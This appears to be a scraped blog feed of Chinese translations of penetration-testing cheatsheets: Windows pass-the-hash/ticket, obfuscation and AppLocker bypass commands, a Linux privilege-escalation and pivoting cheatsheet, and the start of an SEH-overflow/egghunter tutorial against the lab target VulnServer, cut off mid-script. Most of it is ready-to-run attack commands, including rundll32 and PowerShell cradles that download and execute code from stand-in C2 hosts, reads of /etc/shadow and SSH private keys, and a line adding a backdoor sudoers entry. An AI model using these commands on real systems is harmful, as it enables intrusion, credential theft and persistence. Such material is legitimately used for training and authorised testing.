&quot;&lt;msfvenom psh-cmd&gt;&quot;impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolutionsekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a 7.17 Pass-The-Ticket1234567891011#Check my Blog Post Kerberos Attacks in Depth for Further InformationRebeus monitor /interval:30 Monitoring logon sessions every 30 seconds so I can pinch Kerb ticketsReubus will now give you a Kerberos ticket in base64 which you can pass withRubeus.exe ptt /ticket:[base64blobhere]We can now request TGS service tickets to access network resources as this user 0x08 混淆/规避技术8.1 调用混淆1234567891011#https://github.com/danielbohannon/Invoke-ObfuscationCan obfusacte Scripts &amp; Commands Obfusacte script from remote url SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1Can also set Sscript block base64 PSSET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A== 8.2 调用-CradleCraft12345#https://github.com/danielbohannon/Invoke-CradleCrafterSimilar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/eIEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;) 8.3 调用DOSfuscation1#https://github.com/danielbohannon/Invoke-DOSfuscation 8.4 Unicorn https://github.com/trustedsec/unicorn 1unicorn.py Nishang.ps1 0x09 AppLocker /约束模式绕过9.1 验证您是否处于受限模式1$ExecutionContext.SessionState.LanguageMode 9.2 Powershell非常少旁路1234567891011121314git clone https://github.com/decoder-it/powershellveryless.gitC:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:C:\Users\m0chan\Scripts\powershellveryless.exe C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.csExecute -&gt; powershellveryless.exe script.ps1script.ps1 = Script of your Choice 9.3 世界可写文件夹（在Windows 10 1803上为默认）1234567891011121314151617#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.mdC:\Windows\Tasks C:\Windows\Temp C:\windows\tracingC:\Windows\Registration\CRMLogC:\Windows\System32\FxsTmpC:\Windows\System32\com\dmpC:\Windows\System32\Microsoft\Crypto\RSA\MachineKeysC:\Windows\System32\spool\PRINTERSC:\Windows\System32\spool\SERVERSC:\Windows\System32\spool\drivers\colorC:\Windows\System32\Tasks\Microsoft\Windows\SyncCenterC:\Windows\SysWOW64\FxsTmpC:\Windows\SysWOW64\com\dmpC:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenterC:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System 9.4 降级攻击123456Downgrading to PS Version 2 circumvates Constrained Modepowershell.exe -version 2Verifiy versions with $PSVersionTableGet-Host 9.5 AppLocker COR配置文件绕过1234567set COR_ENABLE_PROFILING=1COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dlltzsyncpowershellWhere .DLL is your payload i/e reverse shell, beacon etc. 9.6 MSBuild Powershell / CMD旁路123456789You can use this if cmd is not disabled but powershell ishttps://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csprojC:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csprojAlso https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93cMSBuild PSAttack :D :D 9.7 PSAttack12345#https://github.com/jaredhaight/PSAttackUse if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :) 9.8 NoPowerShell123#https://github.com/bitsadmin/nopowershellPrimiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra. 9.9 runDLL32绕过123456789101112131415#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exerundll32 shell32.dll,Control_RunDLL payload.dllrundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux Notes]]></title>
    <url>%2F2019%2F10%2F11%2FLinux%E6%B3%A8%E9%87%8A-%E5%A4%87%E5%BF%98%E5%8D%95%2F</url>
    <content type="text"><![CDATA[0x00 前言本文是翻译文章：记录在渗透测试过程中，经常会使用的Linux命令。 原文地址：https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html 0x01 列举1.1 基本命令123456789101112131415161718whoamihostname uname -acat /etc/passwordcat /etc/shadowgroupsifconfignetstat -anps aux | grep rootuname -aenvidcat /proc/versioncat /etc/issuecat /etc/passwdcat /etc/groupcat /etc/shadowcat /etc/hosts 1.2 侦察12345678910111213141516秘密的扫毛系统开放的端口# SYN洪泛扫描nmap -sS INSERTIPADDRESS# 全端口扫描nmap INSERTIPADDRESS -p-# 服务版本，默认脚本，操作系统探测nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333#UDP扫描nmap INSERTIPADDRESS -sU# 使用UDP的方式连接开放的端口nc -u INSERTIPADDRESS 48772 1.3 UDP扫描1./udpprotocolscanner &lt;ip&gt; 1.4 FTP枚举1nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS 1.5 启动Web服务器1python -m SimpleHTTPServer 80 0x02 利用libSSH身份验证绕过-CVE-2018-10933 123https://github.com/blacknbunny/libSSH-Authentication-BypassUse nc &lt;ip&gt; 22 to banner grab the SSH Service, if it&apos;s running vulnerable version of libSSH then you can bypass 0x03 特权提升3.1 基本命令123456789101112131415161718192021222324cat /proc/version &lt;- Check for kernel exploitsps auxwwps -eflsof -inetstat -laputenarp -eroutecat /sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/networkcat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainnamecat /etc/issuecat /etc/*-releasecat /proc/versionuname -arpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz-lsb_release -a 3.2 运行pspy64123#https://github.com/DominicBreuker/pspyRun in background and watch for any processes running 3.3 生成TTY12345678910111213#https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;echo os.system(&apos;/bin/bash&apos;)awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos;find / -name blahblah &apos;exec /bin/awk &apos;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&apos; \;python: exit_code = os.system(&apos;/bin/sh&apos;) output = os.popen(&apos;/bin/sh&apos;).read()perl -e &apos;exec &quot;/bin/sh&quot;;&apos;perl: exec &quot;/bin/sh&quot;;ruby: exec &quot;/bin/sh&quot;lua: os.execute(&apos;/bin/sh&apos;)irb(main:001:0&gt; exec &quot;/bin/sh&quot;Can also use socat 3.4 枚举脚本123456cd /EscalationServer/chmod u+x linux_enum.shchmod 700 linuxenum.py./linux_enum.shpython linuxenum.py 3.5 将用户添加到Sudoers1echo &quot;hacker ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers 3.6 列出CronJobs123456789101112crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root 3.7 检查SSH可读SSH密钥的持久性和提升123456789101112131415cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key 3.8 启动脚本1find / -perm -o+w -type f 2&gt;/dev/null | grep -v &apos;/proc\|/dev&apos; 3.9 查找用户或组的可写文件123find / perm /u=w -user `whoami` 2&gt;/dev/nullfind / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/nullfind / -perm /u+w -user `whoami` 2&gt;/dev/nul 3.10 查找用户或组的可写目录12find / perm /u=w -type -d -user `whoami` 2&gt;/dev/nullfind / -perm /u+w,g+w -d -user `whoami` 2&gt;/dev/null 3.11 嗅探流量1234tcpdump -i eth0 &lt;protocol&gt;tcpdump -i any -s0 -w capture.pcaptcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.Xtcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X 3.12 用户安装的软件（有时配置错误）1234567/usr/local//usr/local/src/usr/local/bin/opt//home/var//usr/src/ 0x04 exploit4.1 获得权限1/sbin/getcap -r / 2&gt;/dev/null 4.2 获取SUID二进制文件1find / -perm -u=s -type f 2&gt;/dev/null 4.3 检查Sudo配置1sudo -l 0x05 文件传输5.1 base6412cat file.transfer | base64 -w 0 echo base64blob | base64 -d &gt; file.transfer 5.2 curl1curl http://webserver/file.txt &gt; output.txt 5.3 wget1wget http://webserver/file.txt &gt; output.txt 5.4 FTP12pip install pyftpdlibpython -m pyftpdlib -p 21 -w 5.5 TFTP1234service atftpd startatftpd --daemon --port 69 /tftp/etc/init.d/atftpd restartauxiliary/server/tftp 5.6 NC Listeners12nc -lvnp 443 &lt; filetotransfer.txtnc &lt;ip&gt; 443 &gt; filetransfer.txt 5.7 PHP File Transfers1echo &quot;&lt;?php file_put_contents(&apos;nameOfFile&apos;, fopen(&apos;http://192.168.1.102/file&apos;, &apos;r&apos;)); ?&gt;&quot; &gt; down2.php 5.8 SCP12345# Copy a file:scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext# Copy a directory:scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination 0x06 横向渗透6.1 SSH本地端口转发1ssh &lt;user&gt;@&lt;target&gt; -L 127.0.0.1:8888:&lt;targetip&gt;:&lt;targetport&gt; 6.2 SSH动态端口转发123ssh -D &lt;localport&gt; user@hostnano /etc/proxychains.conf127.0.0.1 &lt;localport&gt; 6.3 索卡特港口前进1./socat tcp-listen:5000,reuseaddr,fork tcp:&lt;target ip&gt;:5001]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Win32缓冲区溢出-SEH溢出和Egghunters]]></title>
    <url>%2F2019%2F10%2F11%2FWin32%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-SEH%E6%BA%A2%E5%87%BA%E5%92%8CEgghunters%2F</url>
    <content type="text"><![CDATA[0x00 前言这是一篇翻译的文章，出自https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。 0x01 介绍1.1 异常处理程序101在从漏洞利用的角度出发进行研究之前，让我们首先讨论一下异常处理程序的 真正含义，不同的类型以及它们在Windows OS中的服务目的。 1.1.1 什么是例外？异常是在程序/功能执行期间发生的事件 1.1.2 不同类型的处理程序异常处理程序（EH） -一段代码，将尝试执行某项操作，并根据结果选择预定义的课程。例如，如果失败，请尝试执行此操作。 结构化异常处理程序（SEH）- Windows内置的异常处理程序，如果开发特定的异常处理程序失败或主要使用，则可用于回退。 下一个结构化异常处理程序（nSEH）- 现在，如您在上面看到的，我确实提到了EH / SEH，因为异常处理程序分为两个不同的类别，即OS级别处理程序和/或由开发人员自己实现的处理程序。如您所见，Windows具有一个称为SEH的操作系统级别。 因此，基本上，异常处理程序是程序内部编写的代码段，其唯一目的是处理应用程序可能引发的任何异常或错误。例如： 12345678910111213try&#123; // Code to try goes here.&#125;catch (SomeSpecificException ex)&#123; // Code to handle the exception goes here.&#125;finally&#123; // Code to execute after the try (and possibly catch) blocks // goes here.&#125; 上面的例子代表了一个基本的异常处理程序（EH）在C#由开发人员实现-有时候看着像上面的代码可以是相当吓人非程序员，但所有我们真正做的是说try运行这段代码：如果有错误/无论catch块包含什么内容，都将发生异常。简单！ 现在，对于软件开发人员来说，编写自己的异常处理程序来管理软件可能遇到的任何错误/警告并不少见，但是Windows还内置了一个称为结构化异常处理程序（SEH）的程序，它可以抛出诸如以下的错误消息Program.exe has stopped working and needs to close：确保您之前都看过它们。 还值得一提的是，无论在OS级别和/或开发人员级别定义了异常处理**程序，Windows SEH都会通过一组指定的内存位置和功能对所有处理程序进行集中和一致的控制和管理，无论是在操作系统级别和/或开发人员级别。**。 1.1.3 那么结构化异常处理程序如何工作？那么，它们如何工作？SEH井是Windows中的一种机制，它利用称为链接列表的数据结构/布局来包含一系列存储位置。触发异常后，操作系统将检索SEH链的头部并遍历列表，处理程序将评估最相关的操作过程，以正常关闭程序或执行指定的操作以从异常中恢复。（更多有关链接的信息） 当我们运行一个应用程序时，将执行该应用程序，并从该应用程序内部运行每个功能，都会创建一个堆栈帧，然后在该函数返回或完成执行后最终弹出该堆栈帧。现在对于异常处理程序实际上同样如此。基本上，如果你运行一个函数具有异常处理程序嵌入itself-该异常处理程序将获得它自己的专用堆栈帧 资料来源：ethicalhacker.net 如您所见，每个代码块都有自己的堆栈框架，由链接每个相应框架的箭头表示。 那么……它们是如何联系的？对每个异常处理程序来说，都有一个配置的异常注册记录，这些记录都链接在一起形成一个链表。该异常注册记录中包含众多领域，但即_EXCEPTION_REGISTRATION_RECORD *Next;它定义的下一个异常注册记录在SEH链 -这是什么使我们过导航SEH链从顶部至底部。 现在，您可能想知道Windows SEH如何使用异常注册记录和处理程序等。当发生异常时，操作系统将从SEH链的顶部启动，并检查第一个异常注册记录以查看它是否可以处理异常/错误，如果可以，它将执行指向异常处理程序的指针定义的代码块-但是，如果不能，它将使用字段移至下一条*记录，并沿*SEH链*向下_EXCEPTION_REGISTRATION_RECORD *Next;移动，并继续执行因此一直沿链向下，直到找到能够处理异常的记录/处理程序*。 但是，如果没有预定义的异常处理程序功能适用，该怎么办？良好的窗口在每个SEH链的底部放置了一个默认/通用异常处理程序，它可以提供如下通用消息Your program has stopped responding and needs to close：通用处理程序在上图中由表示0xffffff 下图提供了整个SEH链的简化概述 我们还可以通过加载二进制文件并单击来查看具有免疫性的SEH链Alt+S -如您在下图中所看到的，我们的SEH链在左下角以绿色突出显示，而SEH Record / SEH Handler在屏幕上以蓝色突出显示。堆。 在这种情况下，我们实际上有2个由SEH Records指定的处理程序-第一个是正常实现的处理程序，而第二个是地址0028FFC4的Window的OS Level处理程序，我们可以在下面的屏幕快照中看到。 1.1.4 漏洞因此，回顾一下，我们已经介绍了异常是什么，不同类型的处理程序，还讨论了结构化异常处理程序的 真正工作原理，因此现在我们可能应该从攻击者的角度谈谈这一点以及我们如何利用这些异常处理程序。处理程序来获得对程序执行流程的控制，类似于EIP Overwrite第1部分中的内容。 现在在这里的第1部分中-我们能够控制VulnServer和SLMail上的执行流程，从而也将它重定向到我们自己的shellcode并弹出一个反向shell，这当然是一个非常古老的漏洞，SEH应该解决此问题，但是一个非常糟糕的实现，很快就被利用了。 现在，我不想在这里展示一个疯狂的示例，因为我将在下面的“ 示例”部分中进行介绍，但是这里的理论是我们不使用用户控制输入覆盖EIP，而是覆盖指向下一个SEH记录（即异常注册）的指针记录以及指向SE处理程序的指针，这些指针指向我们控制并可以放置shellcode的内存区域。 如您所见，我们没有像第1 部分那样覆盖EIP寄存器，41414141而是覆盖了SE Handler和SEH Record的指针。现在，在开始讨论Egghunter以及进行SEH溢出时如何使用它们之前，我想快速向您展示与SE Handler和SEH Record的指针相比，我们如何控制EIP寄存器。 我不会深入探讨细节，但是如果我们可以对永不重复的字符串进行模糊处理，然后计算偏移量，然后使用选择的数据覆盖SE Handler和SE Record，该偏移量可用于控制EIP。 在下面的示例中，我分析了偏移也是SE Record，3519 Bytes因此我在SE Record上加上了4 x B ，在SE Handler上加上了4 xC。查看下面的脚本。 12345678910111213141516171819202122232425#!/usr/bin/pythonimport socketimport sysnseh = &quot;BBBB&quot; seh = &quot;CCCC&quot;buffer=&quot;A&quot; * 3515buffer += nsehbuffer += sehjunk = &quot;D&quot;*(4500-len(buffer))buffer += junktry: print &quot;[*] Starting to Fuzz GMON&quot; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect((&apos;bof.local&apos;,9999)) print &quot;[*] Connected to bof.local on Port 9999&quot; s.send((&apos;GMON /.:/&apos; + buffer)) print &quot;[*] Finished Fuzzing Check SEH Chain on Immunity&quot; s.close()except: print &quot;couldn&apos;t connect to server&quot; 现在，如果我们跳过Immunity并查看SEH链，我们将看到以下内容。 首先让我向您展示一些东西，当前应用程序处于崩溃状态（当然），但是我们仍然可以通过按Shift + F9将异常传递给程序-如果这样做，我们会注意到一些有趣的东西。 SE Handler在堆栈上的值被压入EIP寄存器 ，这当然不是很理想！现在，我们可以控制整个程序的执行流程。 1.1.5 提及POP POP RET因此，如您在上面的屏幕截图/示例中所看到的，我们实际上生活在SE Handler的土地或区域中，由于空间的限制以及我们必须使用的存储区域的小巧性，我们实际上并不好当然，我们也许可以将Egghunters纳入其中，但我将在本文后面讨论。我想首先谈谈POP POP RET通常与SEH溢出结合使用的技术。 1.1.5.1 什么是POP POP RET？现在，实际上，POP POP RET我们将SE Handler值替换为一条POP POP RET指令的内存地址，这将听起来很真实，这将在技术上运行这些汇编指令，从而将我们引向nSEH。 值得一提的是，弹出值转到的寄存器并不重要，我们只需要将ESP 的值上移两次，然后返回即可执行。因此POP EAX，POP EBC，POP ECX等都将适用，只要RET在两次弹出后有相关说明 1.1.5.2 我们为什么要POP POP RET？现在，如果您回想第1部分 -一旦我们获得了对返回地址和EIP的控制，我们就找到了一条JMP ESP指令，以跳到我们的堆栈代码的顶部，在此我们的shell代码和NOP滑动，我们获得了代码执行权。现在，如果我们尝试向SE Handler中添加JMP ESP指令的内存位置，则Windows会自动将所有寄存器清零，以防止用户跳到那里的shellcode，但这确实是一个有缺陷的保护机制。 您实际上可以在下面的屏幕中看到ESI和EDI已被清零，以帮助减轻攻击者直接跳到Shellcode的风险。 现在就在这里POP POP RET，让我们首先记住一下SEH Record＆Handler在堆栈上的布局 现在，让我们考虑一下POP POP RET在这里将执行的操作：POP（向上移动4个字节），POP（向上移动4个字节）和RET（简单返回，将地址发送给EIP作为下一条要执行的指令） -现在我们有了完全控制权； ） 1.1.5.3 查找POP POP RET模块和说明现在，我不想在这里深入探讨如何找到适用的模块和说明，因为我将在示例部分中介绍它，但长话短说是mona 与第1部分类似，我们大量使用了mona，在执行SEH溢出时也将使用它-我们要做的就是发出以下命令 1!mona seh 这将自动在所有可用模块中搜索POP POP RET序列。 现在，就像漏洞利用一样，我们必须确保我们选择内存地址中具有0个错误字符的模块，并避免使用诸如SEEPSEH之类的*SEH防护措施*，我将在后面讨论。 1.2 彩蛋猎人1011.2.1 什么是彩蛋猎人？Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode 1.2.2 彩蛋者如何工作？https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf 我想概述一下Egghunters在这里的工作方式，而无需深入了解，就像我上面已经说过的那样 Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode 这听起来不错，但为什么不仅仅使用简单的Short JMP或JMP ESP跳转到我们的shellcode- 想象一下您有很少的空间可以使用，例如50字节。这没有足够的空间来放置一些shell代码，但是足以放置一个32字节的Egghunter 假设我们可以将32字节的 hunter放入堆栈/内存，并且能够将执行重定向到hunter的位置，我们可以告诉hunter在整个内存空间中搜索预定义的标签，例如MOCH，我们的shellcode将是直接放在此标签（又称鸡蛋）之后 所以执行流程看起来像这样 控制执行力 跳转到包含32字节Egghunter的小缓冲区空间 Egghunter执行并在所有内存中搜索预定义的鸡蛋 Egghunter找到鸡蛋并执行放置在 鸡蛋*之后的* shellcode 1.2.3 一个关于NTDisplayString的词在本文中，我们将使用32字节 Egghunter，它利用NTDisplayString显示为 1234567NTSYSAPI NTSTATUSNTAPINtDisplayString( IN PUNICODE_STRING String ); [参考] [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html] NTDisplayString实际上是在Windows中使用相同的系统调用来显示蓝屏，那么这如何在我们的Egghunter中发挥作用？ 好吧，我们滥用了以下事实：该系统调用用于验证地址范围，并且指针也被读取而不被写入。 这种方法有一个小的缺点，它的系统调用号NTDisplayString无法更改，而且多年来，系统调用号在Windows版本和体系结构上均已更改。 当我写这篇文章时，我实际上遇到了我的Egghunter出现的一些问题，Access Violation reading: FFFFFF即执行INT 2E系统调用时。原因？ 因为我试图在Windows的64位系统上运行Egghunter，所以我有点愚蠢，但是由于该应用程序被编译为32位应用程序并且过去没有太多问题，因此我对此没有多加考虑。 Corelan出色地解释了Egghunter的每个组装指令的功能，因此请查看此处的文章。 0x02 例子2.1 带Egghunter的VulnServer在此示例中，我将介绍VulnServer，这是一个故意易受攻击的服务器，它在端口9999上侦听任何传入的连接，并支持多种类型的命令，如之前在第1部分中看到的。 2.1.1 模糊和发现崩溃现在类似于第1部分，我不想演示如何模糊VulnServer上的每个可用命令。如果您正在寻找类似的内容，请检查我们的booFuzz，它非常酷。在这种情况下，我只打算模糊GMON命令以节省时间并专注于开发部分本身。 让我们使用以下脚本对该命令进行简单的模糊处理来开始它。 1234567891011121314151617181920#!/usr/bin/pythonimport socketimport sysbuffer=[&quot;A&quot;]counter=100while len(buffer) &lt;= 30: buffer.append(&quot;A&quot;*counter) counter=counter+200for string in buffer: print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(string) s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect((&apos;bof.local&apos;,9999)) print &quot;[*] Connected to bof.local on Port 9999&quot; s.send((&apos;GMON /.:/&apos; + string)) s.close()print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(string) 我们在这里所做的工作与第1部分中介绍的基本堆栈溢出非常相似，其中我们在进行以下操作 在端口9999上连接到bof.local 发送GMON /.:/ + string += 200-其中字符串=，A并按200每个周期递增。 关闭TCP连接 一旦应用程序崩溃，脚本将开始运行，我们可以检查Immunity。 现在，当我们跳到Immunity时，我们可能会注意到一些有趣的东西，我注意到的第一件事就是Access Violation when writing to [06500000]Immunity的页脚，这是告诉我们该应用程序处于崩溃状态，并且实际上不知道下一步该怎么做 -您可能还要注意，与包含第1部分的EIP值不同，它看起来很正常41414141-这是由于我们没有过度运行返回地址并获得对EIP寄存器的控制，而是超过了堆栈上的nSEH和SEH值。 让我们通过在Immunity中按下来建立SEH链ALT+S。这样做之后，我们会注意到一些有趣的41414141输出，我们过去在EIP寄存器中看到的输出现在显示在SE Handler中。右键单击41414141并选择Follow in Stack 完美，我们现在可以使用用户提供的输入来覆盖指向nSEH和SEH的指针。现在，让我们找出必须提供多少用户提供的输入才能到达nSEH和SEH的指针 2.1.2 寻找偏移在这里，我们再次找到偏移量，因为我确信您知道这是漏洞利用开发的非常普遍的部分，并且不仅适用于SEH Overlows-有几种不同的方法可以执行此操作，例如手动，metasploit和mona，但是由于偏爱，我会在这里坚持蒙娜丽莎。 首先，使用以下命令创建一个永不重复的字符串/循环模式 1!mona pc 6000 并将其与我们的模糊测试脚本结合在一起，但不必每次都重复A的增量200字节，我们只需将我们的模式与 GMON :./ 123456789101112131415#!/usr/bin/pythonimport socketimport sysbuffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....&quot;print &quot;[*] Starting to Fuzz GMON with pattern containing %s bytes&quot; %len(buffer)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,9999))print &quot;[*] Connected to bof.local on Port 9999&quot;s.send((&apos;GMON /.:/&apos; + buffer))s.close()print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer) 现在，我们的应用程序将返回崩溃状态并报告a，Access Violation但是这次SE Handler包含45336E45的内容相比41414141-让我们再次跳转到堆栈并检查当前驻留在堆栈上的数据。 完善！如您所见，我们正在查看我们永不重复的字符串，并且无法仅通过在mona中使用以下命令之一来计算偏移量 12!mona findmsp!mona po 1En2 如您所见，我们花了3515 个字节来超出nSEH的值，而花了3519个字节来超过SE Handler的值-在我开始拼凑所有内容之前，我想首先花时间来查找任何不良字符。 2.1.3 寻找坏字符我不会在这里解释为什么我们需要找到坏字符，因为我在第1部分中做了很好的工作，所以就去那里。 让我们使用下面的简单脚本，通过命令将每个可能的字符的字符串发送到VulnServerGMON。当然，我们将\x00字符（即空字节）排除在外。 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/pythonimport socketimport sysnseh = &quot;B&quot;*4seh = &quot;C&quot;*4badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)buffer = &quot;A&quot; * (3515-len(badchars))print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;buffer += badchars #All of badcharsbuffer += nseh #BBBBbuffer += seh #CCCCjunk = &quot;D&quot;*(5000-len(buffer))buffer += junk #Bunch of D&quot;s to fill remaining spaceprint &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect((&apos;bof.local&apos;,9999))print &quot;[*] Connected to bof.local on Port 9999&quot;s.send((&apos;GMON /.:/&apos; + buffer))s.close()print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer) 现在，仅简要介绍我们在这里所做的事情 计算不良字符的数量并从3515我们的偏移量减去该值 发送 3260 A&#39;s 